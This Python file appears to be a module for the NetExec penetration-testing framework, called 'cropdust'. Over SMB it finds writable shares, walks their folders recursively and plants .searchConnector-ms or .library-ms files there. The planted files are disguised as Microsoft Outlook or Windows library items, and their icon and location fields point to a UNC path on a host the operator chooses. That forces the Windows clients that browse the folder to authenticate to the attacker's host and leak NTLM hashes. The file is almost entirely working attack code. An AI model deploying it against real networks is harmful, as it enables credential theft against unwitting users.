import ntpath
import tempfile


class CropDuster:
    def __init__(
        self,
        smb,
        logger,
        filename,
        scfile_path,
        url,
        cleanup,
        type,
        share,
        folder,
        force):

            
        self.smb = smb
        self.host = self.smb.conn.getRemoteHost()
        self.max_connection_attempts = 5
        self.logger = logger
        self.results = {}
        self.filename = filename
        self.scfile_path = scfile_path
        self.url = url
        self.cleanup = cleanup
        self.type = type
        self.share = share
        self.folder = folder
        self.force = force


    def get_suitable_shares(self, avbl_shares):
         
        shares = []
        # if a specific share is chosen
        # this bit loops through avbl shares to find it (hopefully)
        if self.share != "All":
            for share in avbl_shares:
                share_name = share["name"]
                if share_name == self.share:
                    # found it
                    self.logger.success(f'Found share:\t{self.share}')
                    # add it to shares list
                    shares.append(share)
                    break
            # if we couldnt find the share, bail
            if not shares:
                self.logger.fail(f'Cannot find share:\t{self.share}')
                return
        # if no specific share has been chosen
        # just add all available shares
        else:
            shares = avbl_shares

        # now we've got a list of shares
        # we need writable ones that aren't admin ones
        # or if force is enabled, whichever ones were chosen    
        try:
            # our final share list
            suitable_shares = []

            # loop through the shares
            for share in shares:
                # get the names and perms
                share_perms = share["access"]
                share_name = share["name"]
                self.logger.display(f'Share "{share_name}" has perms {share_perms}')

                # if the share is C$ or ADMIN$
                # move on to the next share
                if share_name in ['C$', 'ADMIN$']:
                    self.logger.fail(f'Share "{share_name}" is ADMIN$ or C$')
                    continue
                # if the share is writable
                # add it and move on to the next share
                if "WRITE" in share_perms:
                    self.logger.success(f'{share_name} is writable')
                    suitable_shares.append(share_name)
                    continue
                else:
                    self.logger.fail(f'Share "{share_name}" is not writable')
                        # check if force is set
                        # if it is, add to our list anyway
                    if self.force == False:
                        self.logger.display(f'Force is set to false, not adding {share_name} to list')
                        continue
                    else:
                        self.logger.display(f'Force is set to true, adding {share_name} anyway')
                        suitable_shares.append(share_name)
                        continue

            # now we've got some suitable shares
            # lets print them
            if suitable_shares:
                self.logger.display(f'Shares to use:')
                for share in suitable_shares:
                    self.logger.success(f'{share}')
                self.logger.display('')
            # quit if no suitable shares
            else:
                self.logger.fail('No suitable shares')
                return

            # here we recursively find all writable paths in each share
            # or use the specific chosen folder
            for share in suitable_shares:
                
                dir_results = {share: {}}
                # if a specific folder on a share was chosen
                # just set the dir results to that
                if self.folder != "All":
                    dirs = []
                    dirs.append(self.folder)
                    dir_results[share] = dirs
                # otherwise, recursively find all dirs on share(s)
                else:
                    try:
                        dir_results[share] = self.get_dirs(share)
                        # always add the base dir of the share
                        dir_results[share].append("//")
                        self.logger.display(f"Directories on {share}:")

                        # list the directories we found
                        for dir in dir_results[share]:
                            self.logger.success(f"{dir}")
                        self.logger.display(f"")

                    except Exception as e:
                        self.logger.fail(f"Error:\t{e!s}")
                
                # here we drop or clean
                if not self.cleanup:
                    for dir in dir_results[share]:
                        self.drop(share, dir)
                else:
                    for dir in dir_results[share]:
                        self.clean(share, dir)

        # some unknown error
        except Exception as e:
            self.logger.fail(f"Error enumerating shares:\t{e!s}")


    def drop(self, share, directory):

        if self.type == "search":
            extension = ".searchConnector-ms"
        elif self.type == "library":
            extension = ".library-ms"
        self.logger.display(f"Share:\t{share}")
        self.logger.display(f"Dir:\t{directory}")
        file_name = self.filename + extension
        drop_path = ntpath.join(directory, file_name)
        #drop_path = ntpath.join(f'\\', '{}'.format(directory), '{}'.format(file_name))
        with open(self.scfile_path, "rb") as scfile:
            try:
                self.smb.conn.putFile(share, drop_path, scfile.read)
                self.logger.success(f"Wrote:\t{drop_path}")
            except Exception as e:
                self.logger.fail(f"Drop error:\t{e}")


    def clean(self, share, directory):

        if self.type == "search":
            extension = ".searchConnector-ms"
        elif self.type == "library":
            extension = ".library-ms"
        self.logger.display(f"Share:\t{share}")
        self.logger.display(f"Dir:\t{directory}")
        file_name = self.filename + extension
        drop_path = ntpath.join(directory, file_name)
        #drop_path = ntpath.join(f'\\', '{}'.format(directory), '{}'.format(file_name))
        try:
            self.smb.conn.deleteFile(share, drop_path)
            self.logger.success(f"Cleaned:\t{drop_path}")
        except Exception as e:
            self.logger.fail(f"Clean error:\t{e}")


    def get_dirs(self, share, folder="\\"):

        item_list = []
        try:
            # list all items in the current directory
            items = self.smb.conn.listPath(share, folder + "*")
            for item in items:
                # if item is not a dir or is "." or ".."
                # then skip it
                if not item.is_directory() or item.get_longname() in ['.', '..']:
                    continue
                # construct the full path of the directory
                dir_path = f"{folder}{item.get_longname()}\\"
                item_list.append(dir_path)
                
                # recurse into the directory
                # to get all paths
                item_list.extend(self.get_dirs(share, dir_path))
        except Exception as e:
            self.logger.fail(f"Error: {e}")
        
        return item_list


class NXCModule:

    name = "cropdust"
    description = "Recursively or selectively drop a .searchConnector-ms/.library-ms file into folder(s) on writable shares. Has a cleanup and force function"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True


    def options(self, context, module_options):
        """
        Recursively drop a .searchConnector-ms/.library-ms file into folders on writable shares.

        URL                 URL in the dropped file, format is {HOST}@{PORT} - default is "microsoft.com"
        SHARE               Specify a share to target - default is all writable shares
        FOLDER              Specify a specific folder to write to - default is recursive
        FORCE               Force write attempt on chosen shares - default is False
        FILENAME            Specify the filename used WITHOUT extension - default is "Documents"
        TYPE                Specificy type (search/library) - default is "search"
        CLEANUP             Clean up dropped files - default is False
        """
        
        # cleanup
        self.cleanup = False
        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        # url to point to in the dropped file
        self.url = "microsoft.com"
        if "URL" in module_options:
            self.url = str(module_options["URL"])

        # the name of the file
        self.filename = "Documents"
        if "FILENAME" in module_options:
            self.filename = str(module_options["FILENAME"])

        # chosen share
        self.share = "All"
        if "SHARE" in module_options:
            self.share = str(module_options["SHARE"])
        
        # chosen folder
        self.folder = "All"
        if "FOLDER" in module_options and "SHARE" not in module_options:
            context.log.fail("SHARE option is required when specifying folder")
            quit()
        elif "FOLDER" in module_options and "SHARE" in module_options:
            self.folder = str(module_options["FOLDER"])

        # force
        self.force = False
        if "FORCE" in module_options:
            self.force = bool(module_options["FORCE"])
        
        # type
        self.type = "search"
        if "TYPE" in module_options:
            self.type = str(module_options["TYPE"])
        if self.type == "search":
            self.scfile_path = f"{self.filename}.searchConnector-ms"
            # if we aren't doing cleanup, create a local search connector file in temp directory
            if not self.cleanup:
                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.searchConnector-ms"
                with open(self.scfile_path, "w") as scfile:
                    scfile.truncate(0)
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                    scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
                    scfile.write("<description>Microsoft Outlook</description>")
                    scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
                    scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
                    scfile.write(f"<iconReference>\\\\{self.url}\\searchCon.ico</iconReference>")
                    scfile.write("<templateInfo>")
                    scfile.write("<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>")
                    scfile.write("</templateInfo>")
                    scfile.write("<simpleLocation>")
                    scfile.write(f"<url>\\\\{self.url}\\SearchOutlook</url>")
                    scfile.write("</simpleLocation>")
                    scfile.write("</searchConnectorDescription>")
        elif self.type == "library":
            self.scfile_path = f"{self.filename}.library-ms"
            # if we aren't doing cleanup, create a local search connector file in temp directory
            if not self.cleanup:
                self.scfile_path = f"{tempfile.gettempdir()}/{self.filename}.library-ms"
                with open(self.scfile_path, "w") as scfile:
                    scfile.truncate(0)
                    scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
                    scfile.write('<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">')
                    scfile.write("<name>@windows.storage.dll,-34582</name>")
                    scfile.write("<version>6</version>")
                    scfile.write("<isLibraryPinned>true</isLibraryPinned>")
                    scfile.write(f"<iconReference>\\\\{self.url}\\libIcon.ico</iconReference>")
                    scfile.write("<templateInfo>")
                    scfile.write("<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>")
                    scfile.write("</templateInfo>")
                    scfile.write("<searchConnectorDescriptionList>")
                    scfile.write('<searchConnectorDescription>')
                    scfile.write(f"<isDefaultSaveLocation>true</isDefaultSaveLocation>")
                    scfile.write("<isSupported>false</isSupported>")
                    scfile.write("<simpleLocation>")
                    scfile.write(f"<url>\\\\{self.url}\\LibMicrosoft</url>")
                    scfile.write('</simpleLocation>')
                    scfile.write('</searchConnectorDescription>')
                    scfile.write('</searchConnectorDescriptionList>')
                    scfile.write('</libraryDescription>')


    def on_login(self, context, connection):

        context.log.display("Started cropduster module with the following options:")
        context.log.display(f"URL:      {self.url}")
        context.log.display(f"FILENAME: {self.filename}")
        context.log.display(f"SHARE:    {self.share}")
        context.log.display(f"FOLDER:   {self.folder}")
        context.log.display(f"FORCE:    {self.force}")
        context.log.display(f"TYPE:     {self.type}")
        context.log.display(f"CLEANUP:  {self.cleanup}")

        avbl_shares = connection.shares()

        cropdust = CropDuster(
            connection,
            context.log,
            self.filename,
            self.scfile_path,
            self.url,
            self.cleanup,
            self.type,
            self.share,
            self.folder,
            self.force)

        cropdust.get_suitable_shares(avbl_shares)
